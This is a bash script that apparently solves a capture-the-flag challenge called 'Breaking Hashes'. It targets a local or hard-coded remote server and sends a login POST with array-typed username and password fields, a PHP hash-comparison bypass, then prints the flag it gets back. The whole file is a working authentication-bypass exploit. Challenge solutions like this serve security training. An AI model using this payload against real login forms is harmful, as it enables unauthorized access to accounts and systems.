#!/bin/bash

PORT=8000

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.101:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Breaking Hashes
echo "Start exploit for Breaking Hashes"
echo "Flag is"

curl "$URL" -s -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username[]="8"&password[]=8&submit=Login'
